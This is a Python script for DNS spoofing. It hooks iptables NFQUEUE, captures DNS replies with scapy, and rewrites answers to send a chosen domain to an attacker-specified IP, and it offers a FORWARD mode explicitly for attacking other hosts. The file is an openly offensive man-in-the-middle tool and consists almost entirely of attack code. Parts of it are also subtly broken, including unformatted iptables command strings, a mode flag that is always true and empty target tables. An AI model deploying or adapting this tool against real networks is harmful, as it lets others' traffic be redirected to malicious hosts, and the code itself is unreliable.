from gc import callbacks
from operator import sub
from sys import stdout
from typing import Any
import netfilterqueue
import scapy.all as scapy
import subprocess
import os
from progress_tools import Spin
import argparse
import network_tools



dns_host = {
    # Web Domain in bytes : IP in string

}

catch_web = b''


def get_arg():
    parser = argparse.ArgumentParser()

    parser.add_argument('-I', dest='ip_chain', default = 'LOCAL', \
        choices=['FORWARD', 'LOCAL'],  \
        help='IP Tables rules. FORWARD prepared the rule for an outside attack, LOCAL is for local testing')
    parser.add_argument('--queue-num', dest='QUEUE_NUM', type=int, default=0, help='queue number for iptables')

    args = parser.parse_args()
    return args

def cut_packets(packet):
    packet.drop()

def capture_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):    
        before = scapy_packet.summary()
        after = spoof_packet(scapy_packet)
        packet.set_payload( bytes(after) )
        print (f'Before: {before} >> After: {after.summary()}')

    packet.accept()

def spoof_packet(scapy_packet):
    """Unreliable spoofer. It should not work on secure connection like HTTPS, HSTS..."""
    qname = scapy_packet[scapy.DNSQR].qname
    if catch_web in qname:
        print(f"\n [+] Spoofing ;) >> [{qname.decode('utf-8')}] redirecting to [{dns_host[catch_web]}]")
        new_answer = scapy.DNSRR(rrname=bytes(qname), rdata=dns_host[catch_web])

        scapy_packet[scapy.DNS].an = new_answer
        scapy_packet[scapy.DNS].ancount = 1

        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum

        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum

        return scapy_packet
    else:
        return scapy_packet

def setup_iptables(FORWARD=False, QUEUE_NUM=0):
    network_tools.enable_ip_forward(True)
    if FORWARD:
        subprocess.Popen(['iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}'], \
            shell=True, stdout=open(os.devnull, 'wb'))
    else:
        subprocess.Popen(['iptables -I INPUT -j NFQUEUE --queue-num {QUEUE_NUM}; \
            iptables -I INPUT -j NFQUEUE --queue-num {QUEUE_NUM} '], shell=True, stdout=open(os.devnull, 'wb'))

def restore_iptables():
    network_tools.enable_ip_forward(True)
    subprocess.Popen(['iptables', '--flush'], shell=False, stdout=subprocess.PIPE)

if __name__ == '__main__':

    args = get_arg()
    
    try:
        spin_wait = Spin(f'Spoofing DNS: Waiting a domain in our record...')
        setup_iptables(args.ip_chain, args.QUEUE_NUM)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(args.QUEUE_NUM, capture_packet)
        spin_wait.start_spin()
        queue.run()
    except KeyboardInterrupt:
        restore_iptables()
        spin_wait.stop_spin()
        exit(0)
